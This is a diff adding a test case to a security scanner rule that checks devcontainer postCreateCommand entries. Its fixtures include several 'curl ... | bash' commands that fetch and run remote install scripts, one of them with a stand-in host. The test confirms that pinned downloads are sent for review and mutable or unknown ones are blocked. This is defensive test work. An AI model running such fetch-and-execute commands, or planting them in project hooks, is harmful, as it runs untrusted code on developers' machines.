@@ -16,6 +16,16 @@ describe('DOME-DEV-001', () => {
     expect(await runRule(rule, { '.devcontainer.json': dc })).toEqual(['block:payload@.devcontainer.json:1']);
   });
 
+  it('reviews a download pinned to an exact commit, but blocks a mutable or unknown one', async () => {
+    const sha = 'a'.repeat(40);
+    const pinned = JSON.stringify({ postCreateCommand: `curl -fsSL https://raw.githubusercontent.com/o/r/${sha}/install.sh | bash` });
+    expect(await runRule(rule, { '.devcontainer.json': pinned })).toEqual(['review:pinnedDownload@.devcontainer.json:1']);
+    const branch = JSON.stringify({ postCreateCommand: 'curl -fsSL https://raw.githubusercontent.com/o/r/main/install.sh | bash' });
+    expect(await runRule(rule, { '.devcontainer.json': branch })).toEqual(['block:payload@.devcontainer.json:1']);
+    const mixed = JSON.stringify({ postCreateCommand: `curl -fsSL https://raw.githubusercontent.com/o/r/${sha}/a.sh https://example.invalid/DOME_FIXTURE | bash` });
+    expect(await runRule(rule, { '.devcontainer.json': mixed })).toEqual(['block:payload@.devcontainer.json:1']);
+  });
+
   it('skips unchanged commands in a diff scan', async () => {
     const before = JSON.stringify({ postCreateCommand: 'npm ci' });
     const after = JSON.stringify({ postCreateCommand: 'npm ci', name: 'renamed' });
